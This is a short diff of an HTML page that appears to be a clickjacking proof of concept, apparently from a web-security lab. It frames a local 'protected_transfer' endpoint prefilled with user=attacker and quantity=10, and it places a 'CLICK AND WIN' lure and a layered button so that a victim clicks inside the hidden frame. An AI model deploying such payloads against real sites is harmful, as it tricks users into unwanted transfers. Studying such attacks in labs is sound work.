@@ -12,10 +12,11 @@ document.getElementById("second").focus();
 </script>
 </head>
 
-<body id="parentDiv" bgcolor="black" onload="putFocus()">
+<body bgcolor="black">
+<div id="parentDiv" onload="putFocus()">
 <div style="position: absolute; left: 10px; top: 10px;"><p><-------SEE THE BUTTON IN THE TOP-LEFT...HO...HO...CLICK AND WIN!!! <p></div>
 <div id="anotherDiv" style="position: absolute; left: 50px; top: 50px;"></div>
-<input type="button" id="first" style="position: absolute; left: 0px; top: 0px; color: red; font-weight: bold; z-index:-1" value="Click"></input>
+<input type="button" id="first" style="position: absolute; left: 20px; top: 170px; color: red; font-weight: bold; z-index:-1" value="Clickm"></input>
 
 <script>
 var fr = document.getElementById("parentDiv");
@@ -38,6 +39,7 @@ var element = document.getElementById("anotherDiv");
 element.appendChild(para);
 }
 </script>
+<iframe sandbox="allow-scripts allow-forms" id="childDiv" width="750px" height="500px" scrolling="no" src="http://localhost:3000/protected_transfer?user=attacker&quantity=10#main"></iframe>
+</div>
 </body>
-<iframe sandbox="allow-scripts allow-forms" id="childDiv" width="75px" height="500px" scrolling="no" src="http://localhost:3000/protected_transfer#main?user=attacker&quantity=10"></iframe>
 </html>
